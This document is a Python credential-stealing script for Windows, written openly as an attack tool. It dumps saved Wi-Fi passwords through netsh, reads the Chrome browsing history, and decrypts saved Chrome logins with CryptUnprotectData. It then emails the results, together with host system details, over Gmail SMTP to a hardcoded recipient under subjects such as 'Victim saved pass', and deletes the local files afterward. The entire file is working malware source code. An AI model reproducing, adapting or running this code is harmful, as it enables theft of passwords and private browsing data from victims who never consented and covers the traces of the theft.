#!/usr/bin/env python3
import smtplib
import base64, os, sys, re
import sqlite3
import socket
import platform
import uuid
import win32crypt

sender = 'youremail@gmail.com'
reciever = 'email@gmail.com'
password = 'password'

marker = "AUNIQUEMARKER"


def wifipass():
    def get_wlans():
        data = os.popen("netsh wlan show profiles").read()
        wifi = re.compile(r"All User Profile\s*:\s*(.*)")
        return wifi.findall(data)

    def get_pass(network):
        try:
            wlan = os.popen(f"netsh wlan show profile name=\"{network}\" key=clear").read()
            pass_regex = re.compile(r"Key Content\s*:\s*(.*)")
            return pass_regex.search(wlan).group(1)
        except Exception:
            return " "

    with open("wifi.txt", "w") as f:
        for wlan in get_wlans():
            f.write("-----------\n" + f" SSID : {wlan}\n Password : " + get_pass(wlan))


wifipass()


def history():
    import operator
    from collections import OrderedDict

    def parse(url):
        try:
            parsed_url_components = url.split("//")
            sublevel_split = parsed_url_components[1].split("/", 1)
            domain = sublevel_split[0].replace("www.", "")
            return domain
        except IndexError:
            print("[!] URL format error!")

    def analyze(results):
        with open("chrome1.txt", "w") as b:
            for site, count in sites_count_sorted.items():
                b.write(site + "\n")

    data_path = os.path.expanduser("~") + "\AppData\Local\Google\Chrome\User Data\Default"
    files = os.listdir(data_path)
    history_db = os.path.join(data_path, "History")

    c = sqlite3.connect(history_db)
    cursor = c.cursor()
    select_statement = "SELECT urls.url, urls.visit_count FROM urls, visits WHERE urls.id = visits.url;"
    cursor.execute(select_statement)
    results = cursor.fetchall()
    sites_count = {}

    for url, count in results:
        url = parse(url)
        if url in sites_count:
            sites_count[url] += 1
        else:
            sites_count[url] = 1
    sites_count_sorted = OrderedDict(sorted(sites_count.items(), key=operator.itemgetter(1), reverse=True))
    analyze(sites_count_sorted)


history()


def chrome():
    data = os.path.expanduser("~") + "\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    connection = sqlite3.connect(data)
    cursor = connection.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    final_data = cursor.fetchall()

    with open("chrome.txt", "w") as a:
        a.write("Extracted chrome passwords :\n")
        for website_data in final_data:
            password = win32crypt.CryptUnprotectData(website_data[2], None, None, None, 0)[1]
            one = "Website  : " + str(website_data[0])
            two = "Username : " + str(website_data[1])
            three = "Password : " + str(password)
            a.write(one + "\n" + two + "\n" + three)
            a.write("\n" + "====="*10 + "\n")


chrome()

filename = "wifi.txt"
with open(filename, "rb") as fo:
    filecontent = fo.read()
encodedcontent = base64.b64encode(filecontent)

body = """
New stuff info from victim
"""
part1 = """From: Victim <Victim@gmail.com>
To: Filip <toxicnull@gmail.com>
Subject: Victim wifi
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary=%s
--%s
""" % (marker, marker)

part2 = """Content-Type: text/plain
Content-Transfer-Encoding: 8bit

%s
--%s
""" % (body, marker)

part3 = """Content-Type: multipart/mixed; name=\"%s\"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename=%s

%s
--%s--
""" % (filename, filename, encodedcontent, marker)

message = part1 + part2 + part3

try:
    smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
    smtpObj.starttls()
    smtpObj.login(sender, password)
    smtpObj.sendmail(sender, reciever, message)
    fo.close()
    os.remove("wifi.txt")
except Exception:
    print("Error: unable to send email")

filename = "chrome1.txt"
with open(filename, "rb") as fo1:
    filecontent = fo1.read()
encodedcontent = base64.b64encode(filecontent)

body = """
New stuff info from victim - History
"""
part1 = """From: Victim <Victim@gmail.com>
To: Filip <toxicnull@gmail.com>
Subject: Victim chrome history
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary=%s
--%s
""" % (marker, marker)

part2 = """Content-Type: text/plain
Content-Transfer-Encoding: 8bit

%s
--%s
""" % (body, marker)

part3 = """Content-Type: multipart/mixed; name=\"%s\"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename=%s

%s
--%s--
""" % (filename, filename, encodedcontent, marker)

message = part1 + part2 + part3

try:
    smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
    smtpObj.starttls()
    smtpObj.login(sender, password)
    smtpObj.sendmail(sender, reciever, message)
    fo1.close()
    os.remove("chrome1.txt")
except Exception:
    print("Error: unable to send email")

filename = "chrome.txt"
with open(filename, "rb") as fo:
    filecontent = fo.read()
encodedcontent = base64.b64encode(filecontent)

body = """
New stuff info from victim
===========================
Name: %s
FQDN: %s
System Platform: %s
Machine: %s
Node: %s
Platform: %s
Pocessor: %s
System OS: %s
Release: %s
Version: %s
""" % (socket.gethostname(), socket.getfqdn(), sys.platform, platform.machine(), platform.node(), platform.platform(),
       platform.processor(), platform.system(), platform.release(), platform.version())
part1 = """From: Victim <Victim@gmail.com>
To: Filip <toxicnull@gmail.com>
Subject: Victim saved pass
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary=%s
--%s
""" % (marker, marker)

part2 = """Content-Type: text/plain
Content-Transfer-Encoding: 8bit

%s
--%s
""" % (body, marker)

part3 = """Content-Type: multipart/mixed; name=\"%s\"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename=%s

%s
--%s--
""" % (filename, filename, encodedcontent, marker)

message = part1 + part2 + part3

try:
    smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
    smtpObj.starttls()
    smtpObj.login(sender, password)
    smtpObj.sendmail(sender, reciever, message)
    fo.close()
    os.remove("chrome.txt")
except Exception:
    print("Error: unable to send email")
